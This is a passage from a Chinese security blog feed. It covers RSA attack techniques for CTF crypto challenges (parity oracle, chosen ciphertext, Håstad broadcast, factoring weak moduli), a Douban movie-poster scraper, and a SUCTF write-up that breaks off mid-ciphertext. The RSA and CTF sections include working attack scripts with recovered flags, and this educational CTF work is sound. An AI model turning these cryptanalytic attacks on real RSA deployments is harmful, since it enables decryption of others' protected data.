class="line">        <span class="keyword">assert</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> c_of_2</span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># allows for 'precise enough' floats</span></span><br><span class="line">    lower = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    upper = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        possible_plaintext = (lower + upper) / <span class="number">2</span></span><br><span class="line">        <span class="comment"># lower==0 when i&lt;1809</span></span><br><span class="line">        flag = oracle(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            upper = possible_plaintext  <span class="comment"># plaintext is in the lower half</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = possible_plaintext  <span class="comment"># plaintext is in the upper half</span></span><br><span class="line">        c = (c * c_of_2) % n  <span class="comment"># multiply y by the encryption of 2 again</span></span><br><span class="line">        <span class="keyword">print</span> i, flag, int(upper - lower)</span><br><span class="line">        <span class="comment"># time.sleep(0.2)</span></span><br><span class="line">    <span class="comment"># By now, our plaintext is revealed!</span></span><br><span class="line">    <span class="keyword">return</span> int(upper)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Conducting Oracle attack..."</span></span><br><span class="line">    <span class="keyword">return</span> partial((c * c_of_2) % n, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br><span class="line">    c = <span class="number">0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span></span><br><span class="line">    c_of_2 = pow(<span class="number">2</span>, e, n)</span><br><span class="line">    m = main()</span><br><span class="line">    <span class="comment"># m = 560856645743734814774953158390773525781916094468093308691660509501812349</span></span><br><span class="line">    <span class="keyword">print</span> libnum.n2s(m)</span><br><span class="line">    <span class="comment"># QCTF&#123;RSA_parity_oracle_is_fun&#125;</span></span><br></pre></td></tr></table></figure><p><img src="1531637468518.png" alt="Baby RSA"></p><h2 id="选择密文攻击"><a href="#选择密文攻击" class="headerlink" title="选择密文攻击"></a>选择密文攻击</h2><p><strong>适用情况：可以构造任意密文并获得对应明文。</strong> </p><p>这个好理解，在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足<code>gcd(x,n)==1</code> 从而使x模n的逆存在，构造密文 <code>c&#39;=c*(x^e)</code> 使解密后明文为 <code>m&#39;=(m*x)%n</code> ，则<code>m=m&#39;*x^-1(mod n)</code> 。可参看<code>模意义下的运算法则部分</code> 。</p><h2 id="广播攻击"><a href="#广播攻击" class="headerlink" title="广播攻击"></a>广播攻击</h2><p><strong>适用情况：模数n、密文c不同，明文m、加密指数e相同。一般会是e=k，然后给k组数据</strong></p><p>使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个(m^e) ==ci (mod ni)，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况。按照本文的<code>中国剩余定理</code>小节容易求得m^e的值，当e较小时直接开e方即可，可使用<code>gmpy2.iroot(M,e)</code> 方法。</p><p>Python实现：参见本文 <code>中国剩余定理</code>小节。</p><h3 id="例子：2018强网杯nextrsa-Level9"><a href="#例子：2018强网杯nextrsa-Level9" class="headerlink" title="例子：2018强网杯nextrsa-Level9"></a>例子：2018强网杯nextrsa-Level9</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m = random.randint(<span class="number">0x100000000000</span>, <span class="number">0xffffffffffff</span>)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n1 = <span class="number">0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555L</span></span><br><span class="line">n2 = <span class="number">0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867L</span></span><br><span class="line">n3 = <span class="number">0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303L</span></span><br><span class="line">c1 = pow(m, e, n1)</span><br><span class="line">c2 = pow(m, e, n2)</span><br><span class="line">c3 = pow(m, e, n3)</span><br><span class="line"><span class="keyword">print</span> m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h1 id="其他例题"><a href="#其他例题" class="headerlink" title="其他例题"></a>其他例题</h1><h2 id="【Jarvis-OJ-Medium-RSA】解析公钥文件"><a href="#【Jarvis-OJ-Medium-RSA】解析公钥文件" class="headerlink" title="【Jarvis OJ Medium RSA】解析公钥文件"></a>【Jarvis OJ Medium RSA】解析公钥文件</h2><p>使用命令从PEM文件（Privacy-Enhanced Mail 是用于存储和发送密钥、证书等数据的文件格式）中解析公钥对(n,e)，n可在线查询 (<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a>) 到质因子，分解n得到p和q，便能够计算欧拉函数值及解密指数，从而解密。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\neo\Downloads\mediumRSA.rar</span><br><span class="line">λ openssl rsa -pubin -text -modulus -in pubkey.pem</span><br><span class="line">WARNING: can't open config file: /usr/local/ssl/openssl.cnf</span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>carck.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii</span><br><span class="line">n=<span class="number">87924348264132406875276140514499937145050893665602592992418171647042491658461</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"><span class="comment"># via http://factordb.com/</span></span><br><span class="line">p=<span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q=<span class="number">319576316814478949870590164193048041239</span></span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">c=int(open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">m=hex(pow(c,d,n))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> binascii.unhexlify(m.zfill(len(m)+<span class="number">8</span>-len(m)%<span class="number">8</span>))</span><br></pre></td></tr></table></figure><h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>RSA可谓现代密码学的中流砥柱，关于它的可行攻击方法研究还有很多，诸如Timing Attack ，Padding oracle attack，Side-channel analysis attacks等类型的攻击，本文仅介绍了一些通俗易懂的方法，读者还可以阅读 <a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_theory/" target="_blank" rel="noopener">CTF wiki中的非对称加密部分</a> ，以及以 <a href="https://en.wikipedia.org/wiki/RSA_%28cryptosystem%29" target="_blank" rel="noopener">RSA (cryptosystem)</a>  为目录结合谷歌进行进一步学习。 </p><p>本文的例题附件、代码段、工具和后续更新都会放在 <a href="https://github.com/findneo/RSA-ATTACK" target="_blank" rel="noopener">RSA-ATTACK</a> ，欢迎 star &amp; watch 。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://secgroup.dais.unive.it/wp-content/uploads/2012/11/Practical-Padding-Oracle-Attacks-on-RSA.html" target="_blank" rel="noopener">Practical Padding Oracle Attacks on RSA</a> </p><p> <a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_theory/" target="_blank" rel="noopener">CTF wiki中的非对称加密部分</a> </p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>根据豆瓣观影记录生成海报</title>
      <link href="/180706DoubanMovie/"/>
      <url>/180706DoubanMovie/</url>
      
        <content type="html"><![CDATA[<p>效果见 <a href="https://findneo.github.io/p/movie.html">findneo 的观影记录</a>  。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment"># https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/</span></span><br><span class="line"><span class="comment"># http://docs.python-requests.org/zh_CN/latest/user/quickstart.html</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 配置用户ID，可登陆后查看地址栏获取</span></span><br><span class="line">username=<span class="string">"findneo"</span></span><br><span class="line"><span class="comment"># 配置cookies，有些记录可能设置为仅自己可见，那么就需要登陆来获取完整记录</span></span><br><span class="line"><span class="comment"># cookie中只要有dbc12就可以表明身份</span></span><br><span class="line">cookies=dict()</span><br><span class="line"><span class="comment"># cookies=dict(dbcl2="xxxxxxxxxxxxxxxxxxx")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(url)</span>:</span></span><br><span class="line">r=requests.get(url,cookies=cookies)</span><br><span class="line">s=BeautifulSoup(r.content,<span class="string">'lxml'</span>)</span><br><span class="line">one_page=s.find_all(name=<span class="string">'a'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'nbg'</span>&#125;)</span><br><span class="line"><span class="keyword">return</span> one_page</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">url=<span class="string">"https://movie.douban.com/people/%s/collect"</span>%username</span><br><span class="line">page_url=<span class="string">"https://movie.douban.com/people/findneo/collect?start=%d"</span></span><br><span class="line">r=requests.get(url,cookies=cookies)</span><br><span class="line">movie_num=int(BeautifulSoup(r.content,<span class="string">'lxml'</span>).title.string[<span class="number">12</span>:<span class="number">-2</span>])</span><br><span class="line">each_page=<span class="number">15</span></span><br><span class="line">page_num=movie_num/each_page+(movie_num%each_page!=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># page_num=1</span></span><br><span class="line">f=open(<span class="string">'res.html'</span>,<span class="string">'w+'</span>)</span><br><span class="line">content=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(page_num):</span><br><span class="line">purl=page_url%(each_page*i)</span><br><span class="line">content+=parse(purl)</span><br><span class="line">html=<span class="string">"""</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;&lt;meta charset="UTF-8"/&gt;</span></span><br><span class="line"><span class="string">&lt;style type="text/css"&gt;img&#123; width: 10%%; height: 33.3%%; display: block; float: left;&#125;&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt; %s's movie(%d)&lt;/title&gt;\n%s</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">"""</span>%(username,movie_num,<span class="string">'\n'</span>.join(map(str,content)))</span><br><span class="line"><span class="string">"&lt;html&gt;&lt;body&gt;&lt;title&gt;douban&lt;/title&gt;%s"</span></span><br><span class="line">f.write(html)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img2base64</span><span class="params">(infile,outfile)</span>:</span></span><br><span class="line">inf=open(infile)</span><br><span class="line">s=BeautifulSoup(inf,<span class="string">'lxml'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.find_all(<span class="string">'img'</span>):</span><br><span class="line">i[<span class="string">'src'</span>]=<span class="string">"data:image/jpeg;base64,%s"</span>%base64.b64encode(requests.get(i[<span class="string">'src'</span>]).content)</span><br><span class="line">open(outfile,<span class="string">'w+'</span>).write(str(s))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment"># 在当前目录下生成res.html</span></span><br><span class="line">main()</span><br><span class="line"><span class="comment"># 将所有图片下载并用base64编码存储，加载时就无需从豆瓣再获取图片。</span></span><br><span class="line"><span class="comment"># img2base64('res.html','out.html')</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>suctf writeup</title>
      <link href="/180527suctf/"/>
      <url>/180527suctf/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="sandgame"><a href="#sandgame" class="headerlink" title="sandgame"></a>sandgame</h2><p>game.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line">flag = flag.flag</span><br><span class="line">sands = int(flag[<span class="number">5</span>:<span class="number">-1</span>].encode(<span class="string">"hex"</span>), <span class="number">16</span>)</span><br><span class="line">holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"sand.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(holes)):</span><br><span class="line">        sand = sands % holes[i]</span><br><span class="line">        f.write(str(sand)+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>solution.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment"># import flag</span></span><br><span class="line"><span class="comment"># 解同余方程组；中国剩余定理，韩信点兵，扩展欧几里得，模反 &lt;= 深入理解</span></span><br><span class="line"><span class="comment">#求模反元素，模逆元</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>     <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> a!=<span class="number">0</span>:</span><br><span class="line">            a,b = b%a,a</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"><span class="comment">#定义一个函数，参数分别为a,n，返回值为b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>     <span class="title">findModReverse</span><span class="params">(a,m)</span>:</span><span class="comment">#这个扩展欧几里得算法求模逆</span></span><br><span class="line">        <span class="keyword">if</span> gcd(a,m)!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        u1,u2,u3 = <span class="number">1</span>,<span class="number">0</span>,a</span><br><span class="line">        v1,v2,v3 = <span class="number">0</span>,<span class="number">1</span>,m</span><br><span class="line">        <span class="keyword">while</span> v3!=<span class="number">0</span>:</span><br><span class="line">            q = u3//v3</span><br><span class="line">            v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3</span><br><span class="line">        <span class="keyword">return</span> u1%m</span><br><span class="line"></span><br><span class="line">holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line">sand =  [<span class="number">222</span>, <span class="number">203</span>, <span class="number">33</span>, <span class="number">135</span>, <span class="number">203</span>, <span class="number">62</span>, <span class="number">227</span>, <span class="number">82</span>, <span class="number">239</span>, <span class="number">82</span>, <span class="number">11</span>, <span class="number">220</span>, <span class="number">74</span>, <span class="number">92</span>, <span class="number">8</span>, <span class="number">308</span>, <span class="number">195</span>, <span class="number">165</span>, <span class="number">87</span>, <span class="number">4</span>]</span><br><span class="line">M=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> holes:</span><br><span class="line">M*=i</span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> enumerate(holes):</span><br><span class="line">mi=j</span><br><span class="line">Mi=M/mi</span><br><span class="line">s=s+findModReverse(Mi,mi)*sand[i]*Mi</span><br><span class="line"><span class="keyword">print</span> str(hex(s%M)[<span class="number">2</span>:<span class="number">-1</span>]).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="comment"># This_is_the_CRT_xwg)</span></span><br></pre></td></tr></table></figure><p>韩信点兵问题，根据中国剩余定理构造通解</p><p><img src="1527361456797.png" alt="1527361456797"></p><h2 id="Cycle"><a href="#Cycle" class="headerlink" title="Cycle"></a>Cycle</h2><p>cycle.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryt</span><span class="params">(key, plain)</span>:</span></span><br><span class="line">    cipher = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">        cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i]))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPlainText</span><span class="params">()</span>:</span></span><br><span class="line">    plain = <span class="string">""</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"plain.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> line:</span><br><span class="line">                plain += line</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    key = flag.flag</span><br><span class="line">    <span class="keyword">assert</span> key.startswith(<span class="string">"flag&#123;"</span>)</span><br><span class="line">    <span class="keyword">assert</span> key.endswith(<span class="string">"&#125;"</span>)</span><br><span class="line">    key = key[<span class="number">5</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">assert</span> len(key) &gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> len(key) &lt; <span class="number">50</span></span><br><span class="line">    <span class="keyword">assert</span> flag.languageOfPlain == <span class="string">"English"</span></span><br><span class="line">    plain = getPlainText()</span><br><span class="line">    cipher = encryt(key, plain)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"cipher.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(cipher.encode(<span class="string">"base_64"</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>cipher.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">BwcIRTcACAcJUycaGBFSP4bX6WM7BA0DPw4UTTcAGwcUAAcUAQBJIkBhJE4wGgwEczsMAhMJGxqI</span><br><span class="line">nMY2GwZJP0kmBFIgAQd5EgEJFxEfSToGRy0UAQDP8OUoDVI9Gx0cIwcIF1QlCBwTSSRZUzNVNUkp</span><br><span class="line">AFImEQQSPUNNLxsGBxdHYj8WGBhBIg1LipzYPwAfP08uDRUFGQcITqXJ/zVMKRFLNUE4BGMyPQsf</span><br><span class="line">AANIPQ8ARysHB5ucwCgHAFh0OAgfP2UkQgINSQwCRSRVARFBKAAFAgA2BwYYIE8CA1QHBQptdCIQ</span><br><span class="line">UxhFKwwFAVN0CQcXcxsFAFQFEBoPU0A0EBxJIAUOFgA1Bg1TOwYeRRMHBQptaC8HEAFMKRpLBE4w</span><br><span class="line">SAEaIE8KDBIcGmQ0UCMRFgZNLQdMFgA3BwcHIQABbzUGDU4lQT4YEhoAOwAfDQA8ARpTNQYeEQdi</span><br><span class="line">KAADACkZFhVSIBBLLAAwBwdUJ08eABFIBBcURSYTUwFQIwdLEUg1HEkfOhwZbycADE4UQSMRX1RX</span><br><span class="line">JAwZAAcwSBAcJk8aBBoGCE4AT3V/OxtXbAQeBkh0EQYGcxgMCxoJSRwOUyFKeT0HIUkFClR0BAYc</span><br><span class="line">OAYDAlQOBhxHUyUYFhZPKBBhMkkgAEkAPAIIRQcdGQsVSD8YEhoAKwANEVNeOwYeNk8eEAQNGwYC</span><br><span class="line">UiV/IBtNKUkNBEkmER0SPwpNBxgBGh1taj8GB1RTIwQOEUg9Bg5TGk8OBBpIHRsVTmoBHH5zIwQO</span><br><span class="line">B08wEUk6cwwMC1QDAB0UKgNVBBVOOEkYCk0xHAEaPQhNDwEbHU4LSSEQUwBIJRphIU87RQ0cPEIJ</span><br><span 